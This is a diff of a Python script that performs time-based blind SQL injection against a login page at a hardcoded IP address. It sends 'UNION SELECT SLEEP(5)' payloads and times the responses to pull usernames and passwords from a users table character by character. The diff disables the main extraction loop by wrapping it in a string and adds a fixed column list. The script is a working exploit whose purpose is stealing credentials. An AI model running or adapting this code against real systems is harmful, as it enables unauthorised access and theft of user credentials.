@@ -1,10 +1,11 @@
 import requests
 import time
 
-def column_name(database, nom_table):
+def column_name():
     dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
     columns_name=[]
     columns2_name=[]
+    tab = ["id", "username", "password"]
     global table 
     table = ",1,2"
     a=0
@@ -23,6 +24,10 @@ def column_name(database, nom_table):
     global u
     u = 0
     url = "http://51.15.136.118/pageid.php"
+    for j in range (len(tab)):
+        print(tab[j])
+
+    """
     for i in range(1, 50):
         for j in range(0, len(dictionary)):
             if a > 31:
@@ -58,7 +63,7 @@ def column_name(database, nom_table):
                 start_time = time.time()
                 passwd = "' UNION SELECT SLEEP(5)" + table + " id FROM users WHERE id = '" + str(i) + "' and password like '" + texte + dictionary[j] + "%' -- "
                 response = requests.post(url, data={'username': usr, 'password': passwd})
-                """print(passwd)"""
+                print(passwd)
                 end_time = time.time()
                 total_time = end_time - start_time
                 r += 1
@@ -76,7 +81,7 @@ def column_name(database, nom_table):
                 start_time = time.time()
                 passwd = "' UNION SELECT SLEEP(5)" + table + " id FROM users WHERE id = '" + str(i) + "' and username like '" + texte2 + dictionary[j] + "%' -- "
                 response = requests.post(url, data={'username': usr, 'password': passwd})
-                """print(passwd)"""
+                print(passwd)
                 end_time = time.time()
                 total_time = end_time - start_time
                 t += 1  
@@ -89,9 +94,9 @@ def column_name(database, nom_table):
                     a = 0
                     t = 0
                     break
-            a += 1
+            a += 1"""
 
 
 z = "nom_user_db"
 zz = "users"
-column_name(z, zz)
+column_name()
